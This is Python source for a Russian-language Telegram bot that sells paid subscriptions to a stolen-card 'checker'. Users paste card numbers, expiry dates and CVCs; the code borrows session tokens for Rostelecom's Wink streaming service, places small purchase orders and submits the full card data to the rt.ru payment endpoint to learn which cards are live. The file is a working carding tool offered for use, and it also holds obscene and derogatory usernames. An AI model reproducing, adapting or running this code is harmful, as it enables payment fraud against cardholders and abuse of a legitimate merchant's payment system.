import logging
import markups as nav
import time
import datetime
import config as cfg
import requests
import random
import asyncio
import re
import queue
import aiohttp
import asyncio
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types.message import ContentTypes
from time import sleep
from queue import Queue
from asyncio import new_event_loop, set_event_loop
from threading import Thread
from random import choice
from db import Database
from pyqiwip2p import QiwiP2P
from dateutil import parser

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
PREFIX = "/,!,?"

bot = Bot(token=cfg.TOKEN)
dp = Dispatcher(bot)

db = Database('database.db')
p2p = QiwiP2P(auth_key=cfg.QIWI_TOKEN)

def days_to_seconds(days):
    return days * 24 * 60 * 60

def time_sub_day(get_time):
    time_now = int(time.time())
    middle_time = int(get_time) - time_now
    
    if middle_time <= 0:
        return False
    else:
        dt = str(datetime.timedelta(seconds=middle_time))
        dt = dt.replace("days", "дней")
        dt = dt.replace("day", "день")
        return dt

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    user_id= str(message.from_user.id)
    user_name= str(message.from_user.username)
    print(f'{user_name}|{user_id} запустил бота ')
    if message.chat.type == "private":
        if(not db.user_exists(message.from_user.id)):
            db.add_user(message.from_user.id)
            await bot.send_message(message.from_user.id, "😎 Добро пожаловать в !\n Подписку можно оформить по кнопке!", reply_markup=nav.mainMenu)
        else:
            await bot.send_message(message.from_user.id, "😎 Добро пожаловать в !\n Подписку можно оформить по кнопке!", reply_markup=nav.mainMenu)
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать ")



@dp.message_handler(lambda message: message.text == "😼ПРОФИЛЬ") 
async def without_puree(message: types.Message):
    if message.chat.type == "private":       
        user_sub = time_sub_day(db.get_time_sub(message.from_user.id))
        if user_sub == False:
            user_sub = "❌Отсутсвует"
            await bot.send_message(message.from_user.id,
            text=f'''
🆔 ID: <code>{message.from_user.id}</code>
👱 Имя: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
🌐 Имя пользователя: @{message.from_user.username}
👀 Подписка: <b>{user_sub}</b>
            ''', parse_mode='HTML', reply_markup=nav.mainMenu
            )
        else:
            await bot.send_message(message.from_user.id,
            text=f'''
🆔 ID: <code>{message.from_user.id}</code>
👱 Имя: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
🌐 Имя пользователя: @{message.from_user.username}
👀 Подписка: <b>✅Активна, будет действовать {user_sub}</b>
            ''', parse_mode='HTML', reply_markup=nav.mainMenu
            )
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать @ZelenskyShluxaYebok")

@dp.message_handler(lambda message: message.text == "❤️ПОДПИСКА") 
async def without_puree(message: types.Message):
    if message.chat.type == "private":
        await bot.send_message(message.from_user.id,
        text=f'''
🌚 <b>ВАРИАНТЫ ПОДПИСКИ</b>

🤨ПОДПИСКА НА 1 ДЕНЬ
💶ЦЕНА: 40₽
📝СОСТАВЛЯЮЩИЕ:
📃ШЛЮЗ <b>WINK</b>
📃ВРЕМЯ ПОДПИСКИ 1 ДЕНЬ
<b>__________________________________________</b>
❤️Для покупки подписки с другими условиями писать в личные сообщения - <a href="tg://user?id=5100431849">mordoradapter</a>
<b>__________________________________________</b>
⚠️ДЕНЬГИ ЗА ОПЛАЧЕНУЮ ПОДПИСКУ!!
⚠️ВАМ НИКО НЕ ВЕРНЕТ!!!
⚠️БУДТЕ ВНИМАТЕЛЬНЫ!!!!
        ''', parse_mode='HTML',reply_markup=nav.submenu
        )
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать @ZelenskyShluxaYebok")

@dp.message_handler(lambda message: message.text == "💳ПРОВЕРКА СС") 
async def without_puree(message: types.Message):
    if message.chat.type == "private":
        await bot.send_message(message.from_user.id,
        text=f'''
Для проверки сс введите
комманду <b>/cc</b> формата
<code>/cc 1111111111111111|22|33|444
1111111111111111|22|33|444
1111111111111111|22|33|444
1111111111111111|22|33|444</code>

ФОРМАТ ВВОДА ДАННЫХ КАРТ:
1111111111111111 22|33 444
1111111111111111 22/33 444
1111111111111111|22|33|444
        ''', parse_mode='HTML'
        )
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать @ZelenskyShluxaYebok") 


@dp.callback_query_handler(text="subday")
async def subday(call: types.CallbackQuery):
    await bot.delete_message(call.from_user.id, call.message.message_id)
    comment = str(call.from_user.id) + "_40"
    bill = p2p.bill(amount=400, lifetime=15, comment=comment)
    db.add_check(call.from_user.id, bill.bill_id)
    await bot.send_message(call.from_user.id,f"✅Счёт на оплату выставлен\n\n ⚠️Время на оплату: 15 минут\n\n 🌐Ссылка на оплату: {bill.pay_url}\n\n\n Никнейм для оплаты: <code>NEGR332288</code>\n ✍️Комментарий: <code>{comment}</code>\n 💶Сумма оплаты: 400₽\n 🏧Платежная система: QIWIP2P\n\n<b>__________________________________________</b>\nПри переводе по никнейму писаter",parse_mode='HTML', reply_markup=nav.buy_menu(url=bill.pay_url, bill=bill.bill_id))

#@dp.callback_query_handler(text="subweek")
#async def subday(call: types.CallbackQuery):
#    await bot.delete_message(call.from_user.id, call.message.message_id)
#    comment = str(call.from_user.id) + "_1500"
#    bill = p2p.bill(amount=1500, lifetime=15, comment=comment)
#    db.add_check(call.from_user.id, bill.bill_id)
#    await bot.send_message(call.from_user.id,f"✅Счёт на оплату выставлен\n\n ⚠️Время на оплату: 15 минут\n\n 🌐Ссылка на оплату: {bill.pay_url}\n\n\n Никнейм для оплаты: <code>PANGL681</code>\n ✍️Комментарий: <code>{comment}</code>\n 💶Сумма оплаты: 1500₽\n 🏧Платежная система: QIWIP2P",parse_mode='HTML', reply_markup=nav.buy_menu(url=bill.pay_url, bill=bill.bill_id))

#@dp.callback_query_handler(text="submonth")
#async def subday(call: types.CallbackQuery):
#    await bot.delete_message(call.from_user.id, call.message.message_id)
#    comment = str(call.from_user.id) + "_3000"
#    bill = p2p.bill(amount=3000, lifetime=15, comment=comment)
#    db.add_check(call.from_user.id, bill.bill_id)
#    await bot.send_message(call.from_user.id,f"✅Счёт на оплату выставлен\n\n ⚠️Время на оплату: 15 минут\n\n 🌐Ссылка на оплату: {bill.pay_url}\n\n\n Никнейм для оплаты: <code>PANGL681</code>\n ✍️Комментарий: <code>{comment}</code>\n 💶Сумма оплаты: 3000₽\n 🏧Платежная система: QIWIP2P",parse_mode='HTML', reply_markup=nav.buy_menu(url=bill.pay_url, bill=bill.bill_id))


@dp.callback_query_handler(text_contains="check_")
async def check(callback: types.CallbackQuery):
    bill = str(callback.data[6:])
    info = db.get_check(bill)
    if info != False:
        if str(p2p.check(bill_id=bill).status) == "PAID":
            await bot.delete_message(callback.from_user.id, callback.message.message_id)
            await bot.send_message(callback.from_user.id, "✅Счёт успешно оплачен!")
            time_sub = int(time.time()) + days_to_seconds(1)
            db.set_time_sub(callback.from_user.id, time_sub)
            await bot.send_message(callback.from_user.id, "😼Вам выдана подписка!\n Посмотреть оставшееся время можно в профиле!")
            db.delete_check(bill_id=bill)
        else:
            await bot.delete_message(callback.from_user.id, callback.message.message_id)
            await bot.send_message(callback.from_user.id, "⚠️Вы не оплатили счёт!", reply_markup=nav.buy_menu(False, bill=bill))
    else:
        await bot.send_message(callback.from_user.id, "❌Счёт не найден!")



async def try_or(fn, df):
    try:
        return await fn()
    except Exception as err:
        print(14)
        print(err)
        return df

headers = {
    "User-Agent": "WINK/1.34.1 (Android/11)",
    "session_id": "589f7086-d3ff-11ec-92bc-341e6b49f6c8:76064354:66507589:2",
    "x-rt-uid": "1650588778788351753",
    "x-rt-san": "1650588778",
}


    
def try_or(fn, df):
    try:
        return fn()
    except Exception as err:
        print(14)
        print(err)
        return df

async def between_callback(card, mm, yy, cvc, queue):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    loop.run_until_complete(Gateway1(card, mm, yy, cvc, queue))
    a = queue.get()
    loop.close()
    queue.put(a)


def del_sess(session):
    with open('sess.txt') as f:
        lines = f.readlines()

    str = session
    pattern = re.compile(re.escape(str))
    with open('sess.txt', 'w') as f:
        for line in lines:
            result = pattern.search(line)
            if result is None:
                f.write(line)


def get_sess():
 with open ('sess.txt', 'r') as file:
    lines = file.readlines()
    return random.choice(lines).strip()



headers = {
    "User-Agent": "WINK/1.34.1 (Android/11)",
    "session_id": "589f7086-d3ff-11ec-92bc-341e6b49f6c8:76064354:66507589:2",
    "x-rt-uid": "1650588778788351753",
    "x-rt-san": "1650588778",
}

headers2 = {
    "User-Agent": "WINK/1.34.1 (Android/11)",
    "Accept": "application/json, text/plain, */*",
    "Referer": "https://wink.rt.ru/",
    "Origin": "https://wink.rt.ru",
}



async def Getcard(sessionacc):
    while True:
        print('Get card')
        try:
            headers = {"User-Agent": "WINK/1.34.1 (Android/11)","session_id": sessionacc,"x-rt-uid": "1650588778788351753","x-rt-san": "1650588778"}
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get("https://cnt-brsk-itv02.svc.iptv.rt.ru/api/v2/portal/bank_cards") as r:
                    item = await r.json()
                    print (item)
                    total = item['total_items']
                    data = "items"
                    if item != None:
                        if total > 0:
                            iq = item['items']
                            items = iq[0]['id']
                            print(items)
                            return items
                        if total == 0:
                            return 0
                        else:
                            time.sleep(3)
        except:
            time.sleep(2)



async def deleteCard(cardid):
    print("Delete CardId")
    url = f"https://cnt-brsk-itv02.svc.iptv.rt.ru/api/v2/portal/bank_cards/{cardid}"
    params = None
    data = "notification"
    json = None
    ff = lambda: requests.delete(
        url,
        params=params,
        headers=headers,
        json=json,
)
    while True:
        # kk_ = try_or(lambda: ff_(), None)
        # print(kk_)
        kk = try_or(lambda: ff(), None)
        try:
            # print (kk)
            # print(kk.text)
            if data in kk.text:
                # print(kk.json())
                return kk.json()
                sleep(0.1)
                break
            else:
                sleep(0.1)
        except Exception as err:
            print(err)

async def Wink(session):
    json ={
        "price_id":202818819,
        "is_should_link_card":True,
        "service_id":98773779,
        "payment_method_id":1
        }
    json2 ={"events":{"0":[{"event_version":1,"event_counter":22,"timestamp":1652882580999,"san":"99125694453","uid":"HqYGulrxN335QBn2ZoI-3","event_id":"purchase_request","purchase_variant":{"service_id":98773779,"usage_model":"SERVICE","type":"full","price_id":202818819,"currency":"RUB","purchase_cost":29900}}]}}
    headers={"User-Agent": "WINK/1.34.1 (Android/11)","session_id": session,"x-rt-uid": "1650588778788351753","x-rt-san": "1650588778"}
    while True:
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.post('https://cnt-brsk-itv02.svc.iptv.rt.ru/event_collector',json=json2) as s:
                    a = await s.json(content_type=None)
                    print(a)
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.post('https://cnt-brsk-itv02.svc.iptv.rt.ru/api/v2/portal/buy',json=json) as r:
                    dataa = "order_id"
                    data = await r.json(content_type=None)
                    print(data)
                    if dataa in data:
                        return data
                        break
                    else:
                        time.sleep(3)
        except Exception as err:
            logging.error(err, exc_info=True)
            time.sleep(3)



#    async with aiohttp.ClientSession(headers=headers2s,json=json2) as sessionn:
  #      async with sessionn.post('https://securepayments.sberbank.ru:9001/rtk_binding/request') as rr:
  #          json_body2 = await rr.json()
 #           print (json_body2)


async def Wink2(card, mm, yy, cvc, session):
    while True:
        a = await Wink(session)
        print(a)
        data = a
        json = {
			"cardCvc": str(cvc),
			"cardExpMonth": int(mm),
			"cardExpYear": int("20" + yy),
			"cardHolder": "IVAN IVANOV",
			"cardNumber": str(card),
			"confirm": 0,
			"delay": 1,
			"orderId": data['order_id'],
			"payAmount": 29900,
			"payCurrId": "RUB",
			"payTime": "2021-11-28T06:38:43.563+03:00",
			"reqType": "createPayment"
			}
        headers = {"Host": "isespp.pay.rt.ru","User-Agent": "WINK/1.34.1 (Android/11)","Accept": "application/json, text/plain, */*","Referer": "https://wink.rt.ru/","Origin": "https://wink.rt.ru"}
        #url = 'https://securepayments.sberbank.ru:9001/rtk_binding/request'
        url = 'https://isespp.pay.rt.ru/p/1/driver/sdbc'
        if 'order_id' in data:
            async with aiohttp.ClientSession(headers=headers,) as session:
                async with session.post(url,json=json) as r:
                    dataa = "order_id"
                    check = await r.json()
                    print(check)
                    return check
                break
        else:
            time.sleep(3)

async def Gateway1(card, mm, yy, cvc):
    sleep(0.2)
    session = get_sess()
    print(session)
    ccv = f'{card}|{mm}|{yy}|{cvc}'
    if len(yy) == 4:
     yy = yy[-2:]
    bind = await Wink2(card, mm, yy, cvc, session)
    if "reqNote" in bind:
     if bind['reqStatus'] == 101:
      sleep(0.2)
      return(f"""💷 {ccv} — 299₽""")
     else:
        sleep(0.2)
        return(f"""❌ {ccv} — 299₽""")    
    else:
        del_sess(session)
        print(f"removed session: {session}")
        return(f"""✅ {ccv} — 299₽""")


@dp.message_handler(commands="sub")
async def get_checks(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            user_id = str(message.text)[5:]
            time_sub = int(time.time()) + days_to_seconds(1)
            db.set_time_sub(user_id, time_sub)
            await message.reply("Подписка выдана успешно")
            await bot.send_message(user_id, "😼Вам выдана подписка!\n Посмотреть оставшееся время можно в  профиле!")
        else:
            await message.reply("Нет доступа🥴")
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать ")
        
        
@dp.message_handler(commands="sub7")
async def get_checks(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            user_id = str(message.text)[6:]
            time_sub = int(time.time()) + days_to_seconds(7)
            db.set_time_sub(user_id, time_sub)
            await message.reply("Подписка выдана успешно")
            await bot.send_message(user_id, "😼Вам выдана подписка!\n Посмотреть оставшееся время можно в  профиле!")
        else:
            await message.reply("Нет доступа🥴")
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать ")


@dp.message_handler(commands="delsub")
async def get_checks(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            user_id= str(message.text)[8:]
            time_sub = 0
            db.set_time_sub(user_id, time_sub)
            await message.reply("Подписка удалена успешно")
            await bot.send_message(user_id, "😔У вас убрали подписку")
        else:
            await message.reply("Нету доступа🥴")
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать ")

@dp.message_handler(commands="sendall")
async def sendall(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            text = message.text[9:]
            users = db.get_users()
            for row in users:
                try:
                    await bot.send_message(row[0], text)
                    if int(row[1]) != 1:
                        db.set_active(row[0], 1)
                except:
                    db.set_active(row[0], 0)
            await bot.send_message(cfg.ADMIN_ID,"Рассылка завершена успешно!")
        else:
            await message.reply("Нету доступа🥴")
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать ")

@dp.message_handler(commands="restart")
async def sendall(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            text = message.text[9:]
            users = db.get_users()
            for row in users:
                try:
                    await bot.send_message(row[0], "<code>restart</code>", parse_mode='HTML')
                    if int(row[1]) != 1:
                        db.set_active(row[0], 1)
                except:
                    db.set_active(row[0], 0)
            await bot.send_message(cfg.ADMIN_ID,"Рассылка завершена успешно!",)
        else:
            await message.reply("Нету доступа🥴")
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать ")
        
@dp.message_handler(commands="reset")
async def sendall(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            user_id= message.text[7:]
            db.set_antispam(user_id, 1)
            await bot.send_message(cfg.ADMIN_ID,"Сброшено!")
        else:
            await message.reply("Нету доступа🥴")
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать ")


@dp.message_handler(commands="cc")
async def cc(message: types.Message):
    if message.chat.type == "private":
        if db.get_sub_status(message.from_user.id) == False:
            await message.reply(
                text=f'''
                😟 Для работы чекера купите подписку!
                ''', parse_mode='HTML'
                )
        elif db.get_sub_status(message.from_user.id) == True:
            if db.get_antispam(message.from_user.id) == False:
                await message.reply(
                    text=f'''
                    ⛔️🤬 Дождитесь окончания проверки!
                    ''', parse_mode='HTML'
                    )
            elif db.get_antispam(message.from_user.id) == True:
                cc_list = message.text[4:].split("\n")
                if cc_list == []:
                    await message.reply("используй так: /chk 1111111111111111|01|23|123")
                    db.set_antispam(message.from_user.id, 1)
                    return
                elif len(cc_list) > 100:
                    await message.reply("Максимальное количество 100 cc, вы загрузили " + str(len(cc_list)))
                    db.set_antispam(message.from_user.id, 1) 
                    return
                else:
                    db.set_antispam(message.from_user.id, 0)
                    z = await message.reply("Проверка...")
                    m = []
                    for cc in cc_list:
                        fg = cc.replace(' ', '|')
                        fg = fg.replace('/', '|')
                        asd = fg.split("|") 
                        result = await Gateway1(asd[0],asd[1],asd[2],asd[3])
                        if result == "Not":
                            print("❌DEAD")
                        else:               
                            m.append(result)
                            full_data = '\n'.join(m)
                            await z.edit_text(full_data)
                    db.set_antispam(message.from_user.id, 1)
                    await message.answer("Проверка карт завершена!✅")
    elif message.chat.type != "private":
        await message.answer("По чекеру для ПАБЛИК чата писать ")



if __name__ == '__main__':
    set_event_loop(new_event_loop())
    executor.start_polling(dp, skip_updates=True)

